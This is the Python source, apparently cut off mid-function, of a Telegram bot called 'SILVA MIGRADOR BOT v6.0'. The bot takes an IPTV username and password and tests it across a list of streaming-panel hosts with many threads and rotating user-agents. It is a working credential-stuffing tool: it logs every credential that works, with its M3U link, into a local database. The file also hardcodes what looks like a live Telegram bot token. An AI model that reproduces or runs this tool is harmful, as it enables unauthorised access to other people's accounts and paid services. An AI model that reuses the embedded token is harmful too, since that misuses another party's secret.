#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════╗
║   SILVA MIGRADOR BOT v6.0 — Ultra Avançado                   ║
║                                                              ║
║   • Bot puro com botões inline                               ║
║   • Banco de resultados em /sdcard/BANCO/db.txt              ║
║   • Canal de resultados com dados completos do usuário       ║
║   • Anti-abuso: bloqueia 10min se enviar múltiplas creds     ║
║   • DM imediata ao owner em caso de abuso                    ║
║   • Velocidade de verificação por usuário (threads custom)   ║
║   • 5 créditos diários + bônus permanentes do owner          ║
║   • 1º resultado imediato + progresso em tempo real          ║
║   • 80+ user-agents variados para máxima velocidade          ║
║   • Gerenciamento completo: bloquear, punir, revogar         ║
║                                                              ║
║   👤 Edivaldo Silva (@Edkd1) — ID: 2061557102               ║
╚══════════════════════════════════════════════════════════════╝
"""

# ══════════════════════════════════════════════════════════════
# 0. AUTO-INSTALAÇÃO
# ══════════════════════════════════════════════════════════════

import sys
import subprocess
import os

_PKGS = ["telethon", "requests"]

def _pip(pkg):
    for extra in [[], ["--break-system-packages"]]:
        try:
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", "--quiet", pkg] + extra,
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True
        except subprocess.CalledProcessError:
            continue
    return False

def _bootstrap():
    print("🔧 Verificando dependências...")
    for pkg in _PKGS:
        try:
            __import__(pkg.split("[")[0])
        except ImportError:
            print(f"  📦 Instalando {pkg}...")
            print(f"  {'✅' if _pip(pkg) else '⚠️  Falha:'} {pkg}")
    for pkg in ["cryptg"]:
        try: __import__(pkg)
        except ImportError: _pip(pkg)

_bootstrap()

# ══════════════════════════════════════════════════════════════
# 1. IMPORTAÇÕES
# ══════════════════════════════════════════════════════════════

import re
import json
import time
import math
import random
import asyncio
import threading
import traceback
from datetime        import datetime, date, timedelta
from collections     import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

from telethon import TelegramClient, events, Button

# ══════════════════════════════════════════════════════════════
# 2. DIRETÓRIOS E ARQUIVOS
# ══════════════════════════════════════════════════════════════

SCRIPT_DIR     = os.path.dirname(os.path.abspath(__file__))
DADOS_DIR      = os.path.join(SCRIPT_DIR, "BOT123FINAL")
SESSOES_DIR    = os.path.join(DADOS_DIR,  "sessoes")
LOGS_DIR       = os.path.join(DADOS_DIR,  "logs")
RESULTADOS_DIR = os.path.join(DADOS_DIR,  "resultados")
HOSTS_FILE     = "/sdcard/server/hosts.txt"
BANCO_DIR      = "/sdcard/BANCO"
BANCO_FILE     = os.path.join(BANCO_DIR, "db.txt")
LOG_FILE       = os.path.join(LOGS_DIR,  "migrador.log")
CREDITOS_FILE  = os.path.join(DADOS_DIR, "creditos.json")
CONFIG_FILE    = os.path.join(DADOS_DIR, "config.json")
SESSION_BOT    = os.path.join(SESSOES_DIR, "silva_bot")

for _d in (DADOS_DIR, SESSOES_DIR, LOGS_DIR, RESULTADOS_DIR, BANCO_DIR):
    os.makedirs(_d, exist_ok=True)

# Cria banco se não existir
if not os.path.exists(BANCO_FILE):
    open(BANCO_FILE, "w", encoding="utf-8").close()

# ══════════════════════════════════════════════════════════════
# 3. CONSTANTES
# ══════════════════════════════════════════════════════════════

OWNER_ID          = 2061557102
DEFAULT_CREDITOS  = 5
DEFAULT_MAX_URLS  = 1
DEFAULT_THREADS   = 50        # threads padrão por usuário
MAX_THREADS_CAP   = 150       # máximo permitido
REQUEST_TIMEOUT   = 5
CONTENT_TIMEOUT   = 4
COOLDOWN          = 8.0
PUNISH_DURATION   = 600       # 10 minutos em segundos
CANAL_ID          = -1003774905088

BOT_TOKEN = "8618840827:AAEQx9qnUiDpjqzlMAoyjIxxGXbM_I71wQw"

# ══════════════════════════════════════════════════════════════
# 4. USER-AGENTS EXPANDIDOS (80+)
# ══════════════════════════════════════════════════════════════

USER_AGENTS = [
    # Chrome Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    # Chrome Mac
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    # Chrome Linux
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    # Chrome Android
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; OnePlus 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Redmi Note 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    # Edge
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    # Firefox Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    # Firefox Linux
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    # Firefox Mac
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:125.0) Gecko/20100101 Firefox/125.0",
    # Firefox Android
    "Mozilla/5.0 (Android 14; Mobile; rv:125.0) Gecko/125.0 Firefox/125.0",
    "Mozilla/5.0 (Android 13; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0",
    # Safari Mac
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_7_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
    # Safari iOS
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    # Opera
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 OPR/110.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 OPR/110.0.0.0",
    # Samsung Browser
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/117.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36",
    # Media players (IPTV)
    "VLC/3.0.20 LibVLC/3.0.20",
    "VLC/3.0.18 LibVLC/3.0.18",
    "VLC/4.0.0-dev LibVLC/4.0.0-dev",
    "Kodi/20.2 (Linux; Android 10; SHIELD Android TV Build/PPR1.180610.011) App_Bitness/64 Version/20.2-Git:20230726-a4f8b88f18",
    "Kodi/20.1 (Linux; Android 9; BRAVIA 4K VH2) Version/20.1",
    "Kodi/19.4 (Linux; Android 11) Version/19.4",
    "Kodi/20.2 (Windows NT 10.0; WOW64) App_Bitness/32 Version/20.2",
    "TiviMate/4.7.0 (Android 12; Chromecast with Google TV)",
    "TiviMate/4.6.0 (Android 11; Fire TV Stick 4K)",
    "GSE SMART IPTV/7.5 (Android 13; Pixel 7)",
    "IPTV Smarters Pro/3.1 (Android 12; SM-T500)",
    "OTT Navigator/1.6.6.5 (Android 13; Pixel 6)",
    "Perfect Player IPTV/1.6.0 (Android 12)",
    "Televizo/1.9.3 (Android 11; Fire TV Cube)",
    "Sparkle TV/3.2.1 (tvOS 17.4; Apple TV 4K)",
    "STB Emu/5.3.9 (Android 10; Generic)",
    "MX Player/1.80.5 (Android 13; SM-G998B)",
    "ExoPlayer/2.19.1 (Android 14; Pixel 8 Pro)",
    "Downloader/1.3.192 (Android 11; AFT-MT)",
    # Curl/wget style (servidores)
    "curl/8.7.1",
    "curl/7.88.1",
    "python-requests/2.31.0",
    "python-requests/2.28.2",
    "Go-http-client/1.1",
    "Go-http-client/2.0",
    "axios/1.6.8",
    "node-fetch/3.3.2",
    "okhttp/4.12.0",
    "okhttp/3.14.9",
    "Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Build/TQ3A.230901.001)",
    "Dalvik/2.1.0 (Linux; U; Android 14; Pixel 8 Build/UD1A.231105.004)",
    # Android WebView
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.48 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.86 Mobile Safari/537.36",
    # Smart TV
    "Mozilla/5.0 (SMART-TV; Linux; Tizen 8.0) AppleWebKit/538.1 (KHTML, like Gecko) Version/8.0 TV Safari/538.1",
    "Mozilla/5.0 (SMART-TV; Linux; Tizen 7.0) AppleWebKit/538.1 (KHTML, like Gecko) Version/7.0 TV Safari/538.1",
    "Mozilla/5.0 (Linux; Android 9; LG-H870) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.31 SmartTV/7.0",
    "Mozilla/5.0 (SMART-TV; LINUX; Tizen 6.5) AppleWebKit/538.1 (KHTML, like Gecko) Version/6.5 TV Safari/538.1",
    "Opera/9.80 (Linux mips; U; Opera TV Store/6321) Presto/2.12.407 Version/12.50",
    "Dalvik/1.6.0 (Linux; U; Android 4.4.2; FireTV Build/KVT49L)",
    "Mozilla/5.0 (Linux; Android 7.1.2; Fire TV Stick Build/NS6271) AppleWebKit/537.36 Chrome/67.0.3396.87 Mobile Safari/537.36",
]

# ══════════════════════════════════════════════════════════════
# 5. ESTADO GLOBAL
# ══════════════════════════════════════════════════════════════

_em_andamento: set  = set()
_last_query: dict   = {}
_estados: dict      = {}      # uid → dict de estado da conversa

# ──────────────────────────────────────────────────────────────
# PUNIÇÕES: uid → timestamp de quando expira o bloqueio
# ──────────────────────────────────────────────────────────────
_punicoes: dict     = {}
_punicoes_lock      = threading.Lock()

# Cache de info de usuários do Telegram (nome, username)
_user_cache: dict   = {}

# ══════════════════════════════════════════════════════════════
# 6. LOGGING
# ══════════════════════════════════════════════════════════════

def log(msg: str, level: str = "INFO") -> None:
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as fh:
            fh.write(f"[{ts}] [{level:8s}] {msg}\n")
    except IOError:
        pass

# ══════════════════════════════════════════════════════════════
# 7. SISTEMA DE PUNIÇÕES
# ══════════════════════════════════════════════════════════════

def punir_usuario(uid: int, duracao: int = PUNISH_DURATION) -> datetime:
    """Pune o usuário por `duracao` segundos. Retorna quando expira."""
    expira = datetime.now() + timedelta(seconds=duracao)
    with _punicoes_lock:
        _punicoes[uid] = expira.timestamp()
    log(f"Punição aplicada uid={uid} duração={duracao}s expira={expira}", "PUNIÇÃO")
    return expira

def revogar_punicao(uid: int) -> bool:
    """Remove a punição do usuário. Retorna True se havia punição."""
    with _punicoes_lock:
        if uid in _punicoes:
            del _punicoes[uid]
            log(f"Punição revogada uid={uid}", "PUNIÇÃO")
            return True
    return False

def esta_punido(uid: int) -> tuple:
    """Retorna (punido: bool, segundos_restantes: int)."""
    with _punicoes_lock:
        ts = _punicoes.get(uid)
    if ts is None:
        return False, 0
    restante = ts - time.time()
    if restante <= 0:
        with _punicoes_lock:
            _punicoes.pop(uid, None)
        return False, 0
    return True, int(restante)

def estender_punicao(uid: int, segundos: int) -> datetime:
    """Estende a punição atual ou cria nova."""
    with _punicoes_lock:
        ts_atual = _punicoes.get(uid, time.time())
        novo_ts  = max(ts_atual, time.time()) + segundos
        _punicoes[uid] = novo_ts
    expira = datetime.fromtimestamp(novo_ts)
    log(f"Punição estendida uid={uid} +{segundos}s expira={expira}", "PUNIÇÃO")
    return expira

# ══════════════════════════════════════════════════════════════
# 8. SISTEMA DE CRÉDITOS
# ══════════════════════════════════════════════════════════════

_cred_lock = threading.Lock()
TODAY      = lambda: date.today().isoformat()


def _load_cred() -> dict:
    if not os.path.exists(CREDITOS_FILE):
        return {}
    try:
        with open(CREDITOS_FILE, "r", encoding="utf-8") as fh:
            return json.load(fh)
    except (json.JSONDecodeError, IOError):
        return {}


def _save_cred(data: dict) -> None:
    tmp = CREDITOS_FILE + ".tmp"
    try:
        with open(tmp, "w", encoding="utf-8") as fh:
            json.dump(data, fh, indent=2, ensure_ascii=False)
        os.replace(tmp, CREDITOS_FILE)
    except IOError as exc:
        log(f"_save_cred: {exc}", "ERROR")


def _init_user(data: dict, uid: int) -> dict:
    key = str(uid)
    if key not in data:
        data[key] = {
            "diarios_usados": 0,
            "data_reset":     TODAY(),
            "bonus":          0,
            "max_urls":       DEFAULT_MAX_URLS,
            "threads":        DEFAULT_THREADS,
            "bloqueado":      False,
        }
    u = data[key]
    if u.get("data_reset") != TODAY():
        u["diarios_usados"] = 0
        u["data_reset"]     = TODAY()
    # garante campos novos para usuários antigos
    u.setdefault("threads",   DEFAULT_THREADS)
    u.setdefault("bloqueado", False)
    return u


def get_info(uid: int) -> dict:
    with _cred_lock:
        data = _load_cred()
        u    = _init_user(data, uid)
        _save_cred(data)
    return dict(u)


def cred_disponiveis(uid: int) -> dict:
    u            = get_info(uid)
    diarios_rest = max(0, DEFAULT_CREDITOS - u["diarios_usados"])
    bonus        = max(0, u.get("bonus", 0))
    return {"diarios_rest": diarios_rest, "bonus": bonus, "total": diarios_rest + bonus}


def consumir_credito(uid: int) -> bool:
    with _cred_lock:
        data = _load_cred()
        u    = _init_user(data, uid)
        dr   = max(0, DEFAULT_CREDITOS - u["diarios_usados"])
        bn   = max(0, u.get("bonus", 0))
        if dr > 0:
            u["diarios_usados"] += 1; fonte = "diário"
        elif bn > 0:
            u["bonus"] -= 1; fonte = "bônus"
        else:
            _save_cred(data); return False
        _save_cred(data)
    log(f"Crédito consumido uid={uid} fonte={fonte}", "CRED")
    return True


def get_max_urls(uid: int) -> int:
    return get_info(uid).get("max_urls", DEFAULT_MAX_URLS)

def get_threads(uid: int) -> int:
    return max(1, min(get_info(uid).get("threads", DEFAULT_THREADS), MAX_THREADS_CAP))

# Funções admin
def admin_add_bonus(uid, n):
    with _cred_lock:
        d = _load_cred(); u = _init_user(d, uid)
        u["bonus"] = u.get("bonus", 0) + n; _save_cred(d)
    return dict(u)

def admin_set_bonus(uid, n):
    with _cred_lock:
        d = _load_cred(); u = _init_user(d, uid)
        u["bonus"] = n; _save_cred(d)
    return dict(u)

def admin_rm_bonus(uid, n):
    with _cred_lock:
        d = _load_cred(); u = _init_user(d, uid)
        u["bonus"] = max(0, u.get("bonus", 0) - n); _save_cred(d)
    return dict(u)

def admin_reset_dia(uid):
    with _cred_lock:
        d = _load_cred(); u = _init_user(d, uid)
        u["diarios_usados"] = 0; _save_cred(d)
    return dict(u)

def admin_set_urls(uid, n):
    with _cred_lock:
        d = _load_cred(); u = _init_user(d, uid)
        u["max_urls"] = n; _save_cred(d)
    return dict(u)

def admin_add_urls(uid, n):
    with _cred_lock:
        d = _load_cred(); u = _init_user(d, uid)
        u["max_urls"] = min(u.get("max_urls", DEFAULT_MAX_URLS) + n, 50); _save_cred(d)
    return dict(u)

def admin_rm_urls(uid, n):
    with _cred_lock:
        d = _load_cred(); u = _init_user(d, uid)
        u["max_urls"] = max(1, u.get("max_urls", DEFAULT_MAX_URLS) - n); _save_cred(d)
    return dict(u)

def admin_set_threads(uid, n):
    """Define velocidade de verificação (threads) para o usuário."""
    n = max(1, min(n, MAX_THREADS_CAP))
    with _cred_lock:
        d = _load_cred(); u = _init_user(d, uid)
        u["threads"] = n; _save_cred(d)
    return dict(u)

def admin_bloquear(uid):
    with _cred_lock:
        d = _load_cred(); u = _init_user(d, uid)
        u["bloqueado"] = True; _save_cred(d)
    log(f"Usuário bloqueado permanentemente uid={uid}", "ADMIN")
    return dict(u)

def admin_desbloquear(uid):
    with _cred_lock:
        d = _load_cred(); u = _init_user(d, uid)
        u["bloqueado"] = False; _save_cred(d)
    revogar_punicao(uid)
    log(f"Usuário desbloqueado uid={uid}", "ADMIN")
    return dict(u)

def admin_rm_creditos(uid, n):
    """Remove N créditos diários (aumenta usados_hoje)."""
    with _cred_lock:
        d = _load_cred(); u = _init_user(d, uid)
        u["diarios_usados"] = min(DEFAULT_CREDITOS, u["diarios_usados"] + n)
        _save_cred(d)
    return dict(u)

def admin_listar() -> dict:
    with _cred_lock:
        return _load_cred()

def is_bloqueado_perm(uid: int) -> bool:
    return get_info(uid).get("bloqueado", False)

# ══════════════════════════════════════════════════════════════
# 9. BANCO DE RESULTADOS (/sdcard/BANCO/db.txt)
#    Formato: user:pass --> url
#    Sem duplicatas de par (user:pass, url)
# ══════════════════════════════════════════════════════════════

_banco_lock = threading.Lock()


def _ler_banco() -> set:
    """Retorna set de linhas existentes para checar duplicatas."""
    existentes = set()
    try:
        with open(BANCO_FILE, "r", encoding="utf-8") as fh:
            for linha in fh:
                l = linha.strip()
                if l:
                    existentes.add(l)
    except IOError:
        pass
    return existentes


def salvar_no_banco(username: str, password: str, resultados: list) -> int:
    """
    Salva resultados no banco. Retorna quantas linhas novas foram adicionadas.
    Formato: usuario:senha --> url_m3u
    Sem duplicatas.
    """
    novas = 0
    with _banco_lock:
        existentes = _ler_banco()
        linhas_novas = []
        for r in resultados:
            linha = f"{username}:{password} --> {r['m3u_link']}"
            if linha not in existentes:
                linhas_novas.append(linha)
                existentes.add(linha)
                novas += 1
        if linhas_novas:
            with open(BANCO_FILE, "a", encoding="utf-8") as fh:
                for l in linhas_novas:
                    fh.write(l + "\n")
    if novas:
        log(f"Banco: +{novas} entradas para {username}", "BANCO")
    return novas

# ══════════════════════════════════════════════════════════════
# 10. HOSTS
# ══════════════════════════════════════════════════════════════

def carregar_hosts(embaralhar: bool = True) -> list:
    if not os.path.exists(HOSTS_FILE):
        log(f"Hosts não encontrado: {HOSTS_FILE}", "WARN")
        return []
    hosts = []; seen = set()
    try:
        with open(HOSTS_FILE, "r", encoding="utf-8") as fh:
            for line in fh:
                h = line.strip()
                if not h or h.startswith("#"): continue
                h = h.replace("http://","").replace("https://","").rstrip("/")
                if h and h not in seen:
                    seen.add(h); hosts.append(h)
    except IOError as exc:
        log(f"carregar_hosts: {exc}", "ERROR")
    if embaralhar:
        random.shuffle(hosts)
    return hosts

# ══════════════════════════════════════════════════════════════
# 11. HTTP SESSION por thread (rotação de UA)
# ══════════════════════════════════════════════════════════════

_tl = threading.local()

def get_session() -> requests.Session:
    if not hasattr(_tl, "s"):
        s       = requests.Session()
        retry   = Retry(total=1, backoff_factor=0.1,
                        status_forcelist=(500, 502, 503), allowed_methods=["GET"])
        adapter = HTTPAdapter(max_retries=retry,
                              pool_connections=20, pool_maxsize=40)
        s.mount("http://", adapter); s.mount("https://", adapter)
        s.headers.update({
            "User-Agent":      random.choice(USER_AGENTS),
            "Connection":      "keep-alive",
            "Accept":          "application/json, */*",
            "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
            "Accept-Encoding": "gzip, deflate",
        })
        _tl.s = s
    return _tl.s

# ══════════════════════════════════════════════════════════════
# 12. CONSULTA IPTV
# ══════════════════════════════════════════════════════════════

def _fmt_ts(ts) -> str:
    try:
        return datetime.fromtimestamp(int(ts)).strftime("%d/%m/%Y %H:%M:%S")
    except Exception:
        return "N/A"

def _safe(v) -> str:
    return str(v) if v is not None else "N/A"

def contar_conteudo(base_url: str, user: str, pwd: str) -> tuple:
    res = {"live": 0, "vod": 0, "series": 0}
    def req(action, chave):
        try:
            r = get_session().get(
                f"{base_url}?username={user}&password={pwd}&action={action}",
                timeout=CONTENT_TIMEOUT)
            d = r.json()
            res[chave] = len(d) if isinstance(d, list) else 0
        except Exception:
            res[chave] = 0
    ts = [threading.Thread(target=req, args=(a,c), daemon=True)
          for a,c in [("get_live_streams","live"),("get_vod_streams","vod"),("get_series","series")]]
    for t in ts: t.start()
    for t in ts: t.join(timeout=CONTENT_TIMEOUT + 1)
    return res["live"], res["vod"], res["series"]

def testar_host(server: str, username: str, password: str) -> dict | None:
    server   = server.replace("http://","").replace("https://","").rstrip("/")
    base_url = f"http://{server}/player_api.php"
    try:
        r    = get_session().get(
            f"{base_url}?username={username}&password={password}",
            timeout=REQUEST_TIMEOUT)
        data = r.json()
    except Exception:
        return None
    if "user_info" not in data or data["user_info"].get("auth") != 1:
        return None
    ui = data["user_info"]; si = data.get("server_info", {})
    live, vod, series = contar_conteudo(base_url, username, password)
    return {
        "server":      server,
        "username":    _safe(ui.get("username")),
        "password":    _safe(ui.get("password")),
        "status":      _safe(ui.get("status")),
        "criado":      _fmt_ts(ui.get("created_at", 0)),
        "expira":      _fmt_ts(ui.get("exp_date", 0)),
        "max_conn":    _safe(ui.get("max_connections")),
        "active_conn": _safe(ui.get("active_cons")),
        "live":        live, "vod": vod, "series": series,
        "timezone":    _safe(si.get("timezone")),
        "time_now":    _safe(si.get("time_now")),
        "url_server":  _safe(si.get("url")),
        "https_port":  _safe(si.get("https_port")),
        "rtmp_port":   _safe(si.get("rtmp_port")),
        "protocol":    _safe(si.get("server_protocol")),
        "m3u_link":    (f"http://{server}/get.php"
                        f"?username={_safe(ui.get('username'))}"
                        f"&password={_safe(ui.get('password'))}&type=m3u"),
    }

# ══════════════════════════════════════════════════════════════
# 13. FORMATAÇÃO DE MENSAGENS
# ══════════════════════════════════════════════════════════════

def fmt_resultado(r: dict) -> str:
    emoji = "🟢" if r["status"].lower() == "active" else "🔴"
    return (
        f"{emoji}STATUS: {r['status'].upper()}\n"
        f"👤USUÁRIO: {r['username']}\n"
        f"🔑SENHA: {r['password']}\n"
        f"📅CRIADO: {r['criado']}\n"
        f"⏰EXPIRA: {r['expira']}\n"
        f"🔗CONEXÕES MAX: {r['max_conn']}\n"
        f"📡CONEXÕES ATIVAS: {r['active_conn']}\n"
        f"📺CANAIS: {r['live']}\n"
        f"🎬FILMES: {r['vod']}\n"
        f"📺SÉRIES: {r['series']}\n"
        f"🌍TIMEZONE: {r['timezone']}\n"
        f"🕒HORA ATUAL: {r['time_now']}\n"
        f"🌐HOST: {r['server']}\n"
        f"🔎URL: {r['url_server']}\n"
        f"🔗M3U: {r['m3u_link']}\n"
        f"▬▬▬ஜ۩𝑬𝒅𝒊𝒗𝒂𝒍𝒅𝒐۩ஜ▬▬▬"
    )

def fmt_extras(resultados: list) -> str:
    linhas = [f"🔎URL {i}: {r['m3u_link']}" for i, r in enumerate(resultados, 2)]
    linhas.append("▬▬▬ஜ۩𝑬𝒅𝒊𝒗𝒂𝒍𝒅𝒐۩ஜ▬▬▬")
    return "\n".join(linhas)

def _barra(ver: int, total: int) -> str:
    N   = 20
    pre = int(N * min(ver, total) / total) if total else 0
    pct = int(100 * min(ver, total) / total) if total else 0
    return f"[{'█'*pre}{'░'*(N-pre)}] {pct}%"

def msg_loading(username, enc, total, ver, max_r, threads):
    return (
        f"🔍 **CONSULTANDO HOSTS...**\n\n"
        f"👤 Usuário: `{username}`\n"
        f"⚡ Velocidade: `{threads}` threads\n\n"
        f"{_barra(ver, total)}\n"
        f"✅ Encontrados: `{enc}/{max_r}`\n"
        f"🔄 Verificados: `{ver}/{total}`"
    )

def msg_pos_primeiro(username, enc, total, ver, max_r, threads):
    return (
        f"✅ **Você já recebeu o 1º resultado!**\n\n"
        f"⏳ Aguarde... verificando mais hosts.\n\n"
        f"👤 Usuário: `{username}`\n"
        f"⚡ Velocidade: `{threads}` threads\n"
        f"{_barra(ver, total)}\n"
        f"✅ Encontrados: `{enc}/{max_r}`\n"
        f"🔄 Verificados: `{ver}/{total}`"
    )

def msg_concluido(username, total_hits, cred):
    return (
        f"🏁 **Varredura concluída!**\n\n"
        f"👤 Usuário: `{username}`\n"
        f"🏆 Resultados: `{total_hits}`\n\n"
        f"🎟 Diários restantes: `{cred['diarios_rest']}/{DEFAULT_CREDITOS}`\n"
        f"⭐ Bônus permanentes: `{cred['bonus']}`\n\n"
        f"▬▬▬ஜ۩𝑬𝒅𝒊𝒗𝒂𝒍𝒅𝒐۩ஜ▬▬▬"
    )

def msg_sem_resultado(username, total_hosts, cred):
    return (
        f"❌ **Nenhum resultado encontrado**\n\n"
        f"👤 `{username}`\n"
        f"📋 Hosts verificados: `{total_hosts}`\n\n"
        f"ℹ️ Nenhum crédito consumido.\n"
        f"🎟 Diários restantes: `{cred['diarios_rest']}/{DEFAULT_CREDITOS}`\n"
        f"⭐ Bônus: `{cred['bonus']}`"
    )

def fmt_user_info(uid: int, cache: dict) -> str:
    """Formata nome, username e ID do usuário para o canal."""
    info  = cache.get(uid, {})
    nome  = info.get("nome", "Desconhecido")
    uname = info.get("username")
    uname_str = f"@{uname}" if uname else "sem username"
    return f"👤 {nome} ({uname_str}) — ID: `{uid}`"

# ══════════════════════════════════════════════════════════════
# 14. SALVAR ARQUIVO LOCAL
# ══════════════════════════════════════════════════════════════

def salvar_arquivo(username, password, resultados, uid) -> str:
    agora    = datetime.now().strftime("%Y%m%d_%H%M%S")
    filepath = os.path.join(RESULTADOS_DIR, f"resultado_{username}_{agora}.txt")
    linhas   = [
        "╔══════════════════════════════════════════╗",
        "║   RESULTADO DE MIGRAÇÃO — SILVA BOT v6    ║",
        "╚══════════════════════════════════════════╝", "",
        f"Credencial  : {username}:{password}",
        f"Solicitante : ID {uid}",
        f"Data        : {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}",
        f"Total hits  : {len(resultados)}", "", "═"*46, "",
    ]
    for i, r in enumerate(resultados, 1):
        emoji = "🟢" if r["status"].lower() == "active" else "🔴"
        linhas += [
            f"--- RESULTADO {i} ---",
            f"{emoji}STATUS: {r['status'].upper()}",
            f"👤USUÁRIO: {r['username']}", f"🔑SENHA: {r['password']}",
            f"📅CRIADO: {r['criado']}", f"⏰EXPIRA: {r['expira']}",
            f"🔗CONEXÕES MAX: {r['max_conn']}", f"📡CONEXÕES ATIVAS: {r['active_conn']}",
            f"📺CANAIS: {r['live']}", f"🎬FILMES: {r['vod']}", f"📺SÉRIES: {r['series']}",
            f"🌍TIMEZONE: {r['timezone']}", f"🕒HORA ATUAL: {r['time_now']}",
